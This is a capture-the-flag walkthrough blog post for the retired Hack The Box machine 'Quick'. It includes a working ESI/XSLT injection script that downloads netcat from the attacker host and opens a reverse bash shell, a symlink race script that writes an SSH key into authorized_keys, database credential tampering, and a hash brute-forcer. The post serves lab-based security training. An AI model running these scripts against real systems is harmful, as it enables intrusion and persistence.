---
layout: post  
title: "Quick: Hack The Box Walkthrough"
date: 2020-08-30 07:03:48 +0000
last_modified_at: 2020-08-30 07:03:48 +0000
category: Walkthrough
tags: ["Hack The Box", Quick, retired, Linux, Hard]
comments: true
protect: false
image:
  feature: quick-htb-walkthrough.png
---

This post documents the complete walkthrough of Quick, a retired vulnerable [VM][1] created by [MrR3boot][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Quick is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let\'s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.186 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-04-27 04:34:02 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.186
Discovered open port 9001/tcp on 10.10.10.186
```

Nothing much to work with. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,9001 -A --reason 10.10.10.186 -oN nmap.txt
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Quick | Broadband Services
```

No shit. There really isn't much to work with. Anyway, this is what the site (`http://10.10.10.186:9001`) looks like.

{% include image.html image_alt="0a1d5016.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/0a1d5016.png" %}

OK. There's a link to `https://portal.quick.htb` and `/login.php` and `/clients.php`. I'd better put `portal.quick.htb` into `/etc/hosts`.

### HTTP over QUIC a.k.a HTTP/3

There's a subtle hint about the latest TLS and HTTP support. TLS 1.3 is the latest version of TLS and HTTP/3 is the next generation of HTTP . Searching for TLS 1.3 and HTTP/3 will no doubt land you in one of the results that talk about QUIC, the hononym of Quick. I'm pretty sure that\'s what we are looking at here.

{% include image.html image_alt="31273a0c.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/31273a0c.png" %}

The toughest part of this machine is [building](https://github.com/curl/curl/blob/master/docs/HTTP3.md) `curl` with `nghttps` and `ngtcp2` support in Kali Linux. Suffice to say, it's beyond the scope of this write-up to cover how to compile `curl` with experimental HTTP/3 support. You must be wondering, `443/tcp` is not open, how do I connect to `https://portal.quick.htb` then? That's the magic of QUIC, which at one point stands for Quick UDP Internet Connections. It's built on top of UDP.

```
# nc -u -nvz 10.10.10.186 443
(UNKNOWN) [10.10.10.186] 443 (?) open
```

Let's see how `curl` connects to `https://portal.quick.htb` via HTTP/3.

```
# ../repo/curl/src/curl -i --http3 https://portal.quick.htb/
HTTP/3 200
server: nginx/1.16.1
date: Thu, 30 Apr 2020 06:11:50 GMT
content-type: text/html; charset=UTF-8
x-powered-by: PHP/7.4.3
alt-svc: h3-23=":443"; ma=86400


<html>
<title> Quick | Customer Portal</title>
<h1>Quick | Portal</h1>
<head>
<style>
ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 200px;
  background-color: #f1f1f1;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

/* Change the link color on hover */
li a:hover {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>
<p> Welcome to Quick User Portal</p>
<ul>
  <li><a href="index.php">Home</a></li>
  <li><a href="index.php?view=contact">Contact</a></li>
  <li><a href="index.php?view=about">About</a></li>
  <li><a href="index.php?view=docs">References</a></li>
</ul>
</html>
```

`index.php?view=docs` looks interesting.

```
# ../repo/curl/src/curl -i --http3 https://portal.quick.htb/?view=docs
HTTP/3 200
server: nginx/1.16.1
date: Thu, 30 Apr 2020 06:12:49 GMT
content-type: text/html; charset=UTF-8
x-powered-by: PHP/7.4.3
alt-svc: h3-23=":443"; ma=86400

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">

<h1>Quick | References</h1>
<ul>
  <li><a href="docs/QuickStart.pdf">Quick-Start Guide</a></li>
  <li><a href="docs/Connectivity.pdf">Connectivity Guide</a></li>
</ul>
</head>
</html>
```

There's a password in `Connectivity.pdf`.

{% include image.html image_alt="867d3b55.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/867d3b55.png" %}

### Directory/File Enumeration

Let\'s see what `gobuster` and SecLists has to say.

```
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -t 20 -x php -s '200,301,302' -u http://quick.htb:9001/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://quick.htb:9001/
[+] Threads:        20
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/04/27 05:18:06 Starting gobuster
===============================================================
http://quick.htb:9001/clients.php (Status: 200)
http://quick.htb:9001/db.php (Status: 200)
http://quick.htb:9001/home.php (Status: 200)
http://quick.htb:9001/index.php (Status: 200)
http://quick.htb:9001/index.php (Status: 200)
http://quick.htb:9001/login.php (Status: 200)
http://quick.htb:9001/search.php (Status: 200)
http://quick.htb:9001/server-status (Status: 200)
http://quick.htb:9001/ticket.php (Status: 200)
===============================================================
2020/04/27 05:19:48 Finished
===============================================================
```

It's pretty uncommon for `/server-status` to return 200. Let's check the response headers for a file we know for sure will return 0 bytes—`db.php`.

```
# curl -i http://quick.htb:9001/db.php
HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Via: 1.1 localhost (Apache-HttpClient/4.5.2 (cache))
X-Powered-By: Esigate
Content-Length: 0
```

Hmm. Looks like we have some kind of reverse proxy or caching server (Esigate) in place.

### Ticketing System

The connectivity guide mentions something about logging in with the registered email address and the password (`Quick4cc3$$`). Perhaps this would work with the ticketing system?

{% include image.html image_alt="f7b2e1e0.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/f7b2e1e0.png" %}

If I were to fuzz the email addresses, where would I get a list of email addresses?

#### Where can I find usernames?

{% include image.html image_alt="5b2e4319.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/5b2e4319.png" %}

#### Where are these companies from?

{% include image.html image_alt="44966c73.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/44966c73.png" %}

From the two sources above, I came up with the following list of email addresses.

<div class="filename"><span>email.txt</span></div>

```
tim@qconsulting.com
tim@qconsulting.co.uk
tim@qconsulting.eu
roy@darkwing.com
roy@darkwng.com
roy@darkw.ng
roy@darkwingsolutions.com
roy@darkwngsolutions.com
elisa@wink.com
elisa@wink.co.uk
elisa@wink.eu
elisa@winkmedia.com
elisa@winkmedia.co.uk
elisa@winkedia.eu
james@lazycoop.com
james@lazycoop.com.cn
james@lazycoop.co.cn
```

Let\'s use `wfuzz`.

```
# wfuzz -w emails.txt -t 20 --sc 302 -d "email=FUZZ&password=Quick4cc3\$\$" http://10.10.10.186:9001/login.php
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.186:9001/login.php
Total requests: 17

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000010:   302        0 L      0 W      0 Ch        "elisa@wink.co.uk"

Total time: 4.822004
Processed Requests: 17
Filtered Requests: 16
Requests/sec.: 3.525504
```

The email address `elisa@wink.co.uk` seems to be the one. Let's give it a shot.

{% include image.html image_alt="41f30f85.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/41f30f85.png" %}

Gotcha!

### ESI Injection

According to [Wikipedia](https://en.wikipedia.org/wiki/Edge_Side_Includes),

> **Edge Side Includes** or **ESI** is a small markup language for edge level dynamic web content assembly. The purpose of ESI is to tackle the problem of web infrastructure scaling.

We have an edge device here in the form of [ESIGate](http://www.esigate.org/).

To demonstrate that ESI injection works, let raise a ticket and include an ESI tag as follows.

{% include image.html image_alt="f4daeeb4.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/f4daeeb4.png" %}

Take note of the ticket number.

{% include image.html image_alt="d63b0aaa.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/d63b0aaa.png" %}

Searching for the ticket triggers a request to my Python HTTPServer.

{% include image.html image_alt="0198d7e1.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/0198d7e1.png" %}

Long story short, ESIGate is susceptible to a RCE [exploit](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) through XSLT. Because ESIGate is also a caching server, we need to change the contents and the name of the files that we intend to load from our attacking machine.

Here's my game plan.

1. Send a copy of the traditional `nc` with `-c` and `-e` switches over using `wget` to `/tmp/nc`.
2. Set `/tmp/nc` executable with `chmod`.
3. Execute the reverse shell.

I wrote a simple shell script to facilitate this attack.

<div class="filename"><span>exploit.sh</span></div>

```bash
#!/bin/bash

HOST=quick.htb
PORT=9001
EMAIL=elisa@wink.co.uk
PASS='Quick4cc3$$'
COOKIE=$(mktemp -u)
RHOST=10.10.16.5
PAYLOAD=$(urlencode "<esi:include src=\"http://${RHOST}/X.txt\" stylesheet=\"http://${RHOST}/X.xsl\" />")
RHOST=10.10.16.5
RPORT=1234

# Login first
curl -s \
     -c ${COOKIE} \
     -d "email=${EMAIL}&password=${PASS}" \
     -o /dev/null \
     http://${HOST}:${PORT}/login.php

# Function to send payload
function send() {
local TKT=$(curl -s \
                 -b ${COOKIE} \
                 http://${HOST}:${PORT}/ticket.php \
            | grep -Eo '"TKT-[0-9]+"' \
            | tr -d '"')

curl -s \
     -b ${COOKIE} \
     -d "title=$1&msg=${PAYLOAD//X/$1}&id=${TKT}" \
     -o /dev/null \
     http://${HOST}:${PORT}/ticket.php

curl -s \
     -b ${COOKIE} \
     -o /dev/null \
     http://${HOST}:${PORT}/search.php?search=${TKT}
}

# Random filename
function random() {
    echo $(dd if=/dev/urandom count=4 bs=1 status=none | md5sum | cut -c1-8)
}

STEP1=$(random)
STEP2=$(random)
STEP3=$(random)

# Step 1: Send `nc' with `wget'
echo ${STEP1} > ${STEP1}.txt
sed -r "s|CMD|wget -O\/tmp\/nc ${RHOST}\/nc|" esi.xsl > ${STEP1}.xsl
send "${STEP1}"

# Step 2: chmod +x /tmp/nc
echo ${STEP2} > ${STEP2}.txt
sed -r "s|CMD|chmod 777 \/tmp\/nc|" esi.xsl > ${STEP2}.xsl
send "${STEP2}"

# Step 3: run reverse shell
echo ${STEP3} > ${STEP3}.txt
sed -r "s|CMD|\/tmp\/nc ${RHOST} ${RPORT} -e \/bin\/bash|" esi.xsl > ${STEP3}.xsl
send "${STEP3}"

# Clean up
rm -rf $COOKIE
rm -rf ${STEP1}.{txt,xsl}
rm -rf ${STEP2}.{txt,xsl}
rm -rf ${STEP3}.{txt,xsl}
```

Let's give it a shot.

{% include asciinema.html url="https://asciinema.org/a/HXTfHp08LAZY5RQopa9i9Vkxn" title="Running exploit.sh" author="limbernie" speed="0.75" poster="npt:0:25" preload="preload" %}

Awesome.

## Low-Privilege Shell

With that, we can upgrade the shell to a full TTY by injecting a RSA public key we control to `/home/sam/.ssh/authorized_keys`. The flag `user.txt` is at `sam`'s home directory.

{% include image.html image_alt="360fa559.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/360fa559.png" %}

## Privilege Escalation

During enumeration of `sam`'s account, I notice the presence of another account `srvadm`.

{% include image.html image_alt="bb080dc4.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/bb080dc4.png" %}

### Local Port Forwarding

It appears that `srvadm` is running another virtual host on the loopback interface.

{% include image.html image_alt="c24d4df4.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/c24d4df4.png" %}

```
<VirtualHost *:80>
        AssignUserId srvadm srvadm
        ServerName printerv2.quick.htb
        DocumentRoot /var/www/printer
</VirtualHost>
```

I'd previously use SSH to forward my local port `9080/tcp` to port `80/tcp` on the loopback interface like so.

```
# ssh -L 9080:127.0.0.1:80 -i sam  sam@10.10.10.186
```

### Quick | POS Print Server

This is what the site (`http://printerv2.quick.htb`) looks like.

{% include image.html image_alt="774b2357.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/774b2357.png" %}

We can take a peek at the database to see what are the valid credentials for this site but first we need the database credentials.

<div class="filename"><span>/var/www/printer/db.php</span></div>

```
<?php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
?>
```

{% include image.html image_alt="7d87722b.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/7d87722b.png" %}

Awesome. We can inject any password of our choice into the database.

#### Home-brewed password hash

If you open up `/var/www/printer/index.php`, you'll see the password hash format.

```
$email=$_POST["email"];
$password = $_POST["password"];
$password = md5(crypt($password,'fa'));
$stmt=$conn->prepare("select email,password from users where email=? and password=?");
$stmt->bind_param("ss",$email,$password);
$stmt->execute();
$result = $stmt->get_result();
$num_rows = $result->num_rows;
if($num_rows > 0 && $email === "srvadm@quick.htb")
```

Let's use the password `password`.

```
$ perl -e "print crypt('password', 'fa')" | md5sum | tr -d ' -'
0c0ba48811bed85e3093bc71c6037891
```

Update the table `users` like so.

```
$ mysql -udb_adm -pdb_p4ss -Dquick -e "UPDATE users SET password = '0c0ba48811bed85e3093bc71c6037891' WHERE email = 'srvadm@quick.htb';"
```

{% include image.html image_alt="3a9da05a.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/3a9da05a.png" %}

Bam.

### Deception Technology

After getting into the so-called Print Server, I realized that all you need to advance to the next step is in the source code, particularly `/var/www/printer/job.php`. Heck, you don't even need to add a printer for goodness' sake.

<div class="filename"><span>job.php</span></div>

```php
$title=$_POST["title"];
$file = date("Y-m-d_H:i:s");
file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
chmod("/var/www/printer/jobs/".$file,"0777");
$stmt=$conn->prepare("select ip,port from jobs");
$stmt->execute();
$result=$stmt->get_result();
if($result->num_rows > 0)
{
        $row=$result->fetch_assoc();
        $ip=$row["ip"];
        $port=$row["port"];
        try
        {
                $connector = new NetworkPrintConnector($ip,$port);
                sleep(0.5); //Buffer for socket check
                $printer = new Printer($connector);
                $printer -> text(file_get_contents("/var/www/jobs/".$file));
                $printer -> cut();
                $printer -> close();
                $message="Job assigned";
                unlink("/var/www/jobs/".$file);
        }
        catch(Exception $error)
        {
                $error="Can't connect to printer.";
                unlink("/var/www/jobs/".$file);
        }
}
else
{
        $error="Couldn't find printer.";
}
```

If I were to create a symbolic link between a file named with this format ("`Y-m-d_H:i:s`") and a file owned by `srvadm`, I should be able to write to it. Armed with this insight, I wrote the following script to inject a RSA public key I control to `/home/srvadm/.ssh/authorized_keys`.

<div class="filename"><span>race.sh</span></div>

```bash
#!/bin/bash

DBADMIN=db_adm
DBPASS=db_p4ss
HASH="$(perl -e "print crypt('password', 'fa')" | md5sum | tr -d ' -')"
COOKIE=$(mktemp -u)
HOST=printerv2.quick.htb
KEY="ssh-rsa AAAAB3N...brLF98=%0a"

# Modify database; need to be quick!
mysql -u$DBADMIN -p$DBPASS -Dquick -e "UPDATE users SET password = '$HASH' WHERE email = 'srvadm@quick.htb'" &>/dev/null

# Login
curl -s \
     -c $COOKIE \
     -d 'email=srvadm@quick.htb&password=password' \
     -H "Host: $HOST" \
     -m 3 \
     -o /dev/null \
     127.0.0.1/index.php

ln -s /home/srvadm/.ssh/authorized_keys /var/www/jobs/$(date +%F_%H:%M:%S)

curl -s \
     -b $COOKIE \
     -d "title=Test&desc=${KEY//+/%2b}&submit=" \
     -H "Host: $HOST" \
     -m 3 \
     -o /dev/null \
     127.0.0.1/job.php

rm -rf $COOKIE
```

{% include image.html image_alt="11a671ea.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/11a671ea.png" %}

I'm in.

### Getting `root.txt`

During enumeration of `srvadm`'s account, I notice the presence of `printers.conf` in `/home/srvadm/.cache/conf.d`. Guess what I found.

{% include image.html image_alt="275dffff.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/275dffff.png" %}

That looks a lot like some kind of password. It's decoded to `&ftQ4K3SGde8?`. Could this be `root`'s password? There's only one way to find out.

{% include image.html image_alt="deced3d1.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/deced3d1.png" %}

Bingo! Getting `root.txt` should be easy.

{% include image.html image_alt="55418d47.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/55418d47.png" %}

:dancer:

## Afterthought

I thought why not give it a go and try to brute-force `srvadm`'s password hash for fun. I wanted to make use of John the Ripper's dynamic format at first but decided that it was too much time and brain cells. So I wrote a simple shell script instead.

<div class="filename"><span>brute.sh</span></div>

```bash
#!/bin/bash

HASH=$1
ROCK=$2

function die() {
    killall perl 2>/dev/null
}

export -f die

function check() {
    local PASS=$1
    local HASH=$2
    if [ $(perl -e 'print crypt("@ARGV", "fa")' $PASS | md5sum | tr -d ' -') == "$HASH" ]; then
        echo "[+] Password is: $PASS"
        die
    fi
}

export -f check

parallel -q check :::: $ROCK ::: $HASH
```

Combined with GNU Parallels, you get a "quick" multi-threaded brute-forcer of sorts. You'll get a better performance if you split up `rockyou.txt` into smaller chunks, i.e. divide and conquer.

```
# split -n 100 /usr/share/wordlists/rockyou.txt -a 3 -d rockyou_
# time parallel -j10 ./brute.sh ::: e626d51f8fbfd1124fdea88396c35d05 ::: rockyou_* 2>/dev/null
[+] Password is: yl51pbx

real    2m24.566s
user    5m37.516s
sys     3m49.072s
```

Not too bad considering `rockyou.txt` has about 14 million lines.

{% include image.html image_alt="e3912da5.png" image_src="/688dabf6-a633-4a54-8deb-15f420ae544c/e3912da5.png" %}

_No python was harmed during the writing of this walkthrough._

*[ESI]:Edge Side Includes
*[RCE]: Remote Code Execution
*[XSLT]: Extensible Stylesheet Language Transformation

[1]: https://www.hackthebox.eu/home/machines/profile/244
[2]: https://www.hackthebox.eu/home/users/profile/13531
[3]: https://www.hackthebox.eu/
